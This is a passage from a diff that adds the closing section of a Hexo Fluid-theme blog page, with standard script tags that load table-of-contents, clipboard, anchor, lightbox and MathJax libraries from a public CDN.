+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
